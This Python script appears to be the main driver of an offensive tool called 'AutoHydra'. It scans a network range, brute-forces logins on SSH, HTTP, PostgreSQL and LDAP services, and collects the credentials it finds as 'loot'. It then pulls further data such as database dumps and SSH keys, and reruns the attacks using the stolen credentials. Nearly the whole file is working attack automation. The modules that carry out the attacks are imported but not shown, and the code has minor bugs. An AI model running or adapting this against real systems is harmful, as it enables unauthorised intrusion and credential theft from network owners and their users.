#/usr/bin/env python3
import os, sys
import autonmap
from util import log_loot, get_logged_loot, Color, print_all_loot
from http import HTTP
from ldap import LDAP
from ssh import SSH
from postgresql import postgresql

logo = r"""
                _        _    _           _           
     /\        | |      | |  | |         | |          
    /  \  _   _| |_ ___ | |__| |_   _  __| |_ __ __ _ 
   / /\ \| | | | __/ _ \|  __  | | | |/ _` | '__/ _` |
  / ____ \ |_| | || (_) | |  | | |_| | (_| | | | (_| |
 /_/    \_\__,_|\__\___/|_|  |_|\__, |\__,_|_|  \__,_|
                                 __/ |                
                                |___/  
          _)                              (_
         _) \ /\%/\  /\%/\  /\%/\  /\%/\ / (_
        _)  \\(0 0)  (0 0)  (0 0)  (0 0)//  (_
        )_ -- \(oo)   (oo)   (oo)  (oo)/-- _(
         )_ / /  \_,__/ \__,__/ \_,__/  \ \ _(
          )_ /   --;-- --;- --;-- --;--  \ _( 
       *.   (      ))   ()   ((     ()    )    .*
         '...(___)z z(__)z(__)z(__)z z(__)....'  

"""

exploits = {
    'ssh': SSH(),
    'http': HTTP(),
    'postgres': postgresql(),
    'ldap': LDAP()
}

def read_lines(filename):
    with open(filename, 'r') as f:
        lines = f.read_lines()
    return lines

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Automate Hydra attacks against a specified network range.")
    parser.add_argument("-i", "--host_ips", metavar="<i>", type=str,
                        help="IP address range to search", dest='host_ips')
    parser.add_argument("-u", "--usernames", metavar="<u>", type=str,
                        help="File with list of usernames", default=None, dest='usernames')
    parser.add_argument("-p", "--passwords", metavar="<p>", type=str,
                        help="File with list of passwords", default=None, dest='passwords')
    parser.add_argument("-o", "--output", metavar="<o>", type=str,
                        help="Optional file to output results to", default=sys.stdout, dest='output')
    parser.add_argument("-d", "--domain", metavar="<d>", type=str,
                        help="The domain of a potential LDAP server to attack",
                        default="glauth.com", dest='domain')
    args = parser.parse_args()

    if isinstance(args.output, str):
        args.output = open(args.output, 'w')
    else:
        print(logo)

    # automatically scan the IP address range and log all open ports that we support attacking
    print(f"{Color.GRN}Scanning IP address range {args.host_ips}...{Color.END}", file=args.output)
    host_openings = autonmap.autonmap(args.host_ips)

    for host in host_openings:
        # automate a Hydra-esque attack on this host
        for open_service in host_openings[host]:
            exploit = exploits[open_service]
            exploit.output = args.output
            exploit.domain = args.domain # mainly important for LDAP
            print(f"{Color.ULINE}Round 1 of attacking host {host} on port {exploit.port} using {exploit.name}.",
                  f"This may take a while.{Color.END}",
                    file=args.output)
            # TODO use multiprocessing to do this asynchronously
            # hydra for everyone but ldap
            initial_loot = exploit.attack(host, args.usernames, args.passwords)
            # loot is a list of tuples (username, password). Either field can be None.
            if initial_loot:
                log_loot(initial_loot, args.output)
                # get more info from each service (finger, database dumps, ssh keys, etc.)
                more_loot = exploit.getloot(host, initial_loot)
                if more_loot:
                    log_loot(more_loot, args.output)

    # attack with our new loot
    if not get_logged_loot():
        print("Attacks completed. No loot gained.", file=args.output)
        return
    print(f"{Color.GRN}Attack completed. Re-attacking services using any stored loot.{Color.END}", file=args.output)

    # cache all usernames/passwords in memory before round 2
    suggested_usernames, suggested_passwords = [], []
    with open(args.usernames, 'r') as g:
        for suggested_username in g.readlines():
            suggested_usernames.append(suggested_username.strip())
    with open(args.passwords, 'r') as g:
        for suggested_password in g.readlines():
            suggested_passwords.append(suggested_password.strip())

    for host in host_openings:
        for open_service in host_openings[host]:
            exploit = exploits[open_service]
            found_usernames, found_passwords = zip(*get_logged_loot())
            if not found_usernames or not found_passwords:
                return
            print(f"{Color.ULINE}Round 2 of attacking host {host} on port {exploit.port} using {exploit.name}.",
                  f"This may take a while.{Color.END}",
                    file=args.output)
            found_usernames = list(found_usernames) + list(suggested_usernames)
            found_passwords = list(found_passwords) + list(suggested_passwords)
            found_usernames = list(set(x for x in found_usernames if x))
            found_passwords = list(set(x for x in found_passwords if x))
            with open('data/usernames_cache.txt', 'w') as f:
                for username in found_usernames:
                    f.write('%s\n' % username)
            with open('data/passwords_cache.txt', 'w') as f:
                for passwords in found_passwords:
                    f.write('%s\n' % passwords)
            new_loot = exploit.attack(host, 'data/usernames_cache.txt', 'data/passwords_cache.txt')
            os.remove('data/usernames_cache.txt')
            os.remove('data/passwords_cache.txt')
            if new_loot:
                log_loot(new_loot, args.output)
                more_loot = exploit.getloot(host, new_loot)
                if more_loot:
                    log_loot(more_loot, args.output)
    print_all_loot(args.output)

if __name__=='__main__':
    main()
